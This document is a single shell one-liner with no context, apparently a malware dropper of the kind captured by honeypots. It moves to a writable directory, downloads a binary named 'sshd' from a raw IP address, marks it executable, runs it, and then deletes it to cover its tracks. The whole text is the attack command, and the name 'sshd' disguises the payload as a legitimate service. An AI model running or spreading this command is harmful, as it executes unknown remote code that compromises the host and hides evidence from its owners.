cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://165.227.5.177/sshd; chmod +x sshd; ./sshd; rm -rf sshd
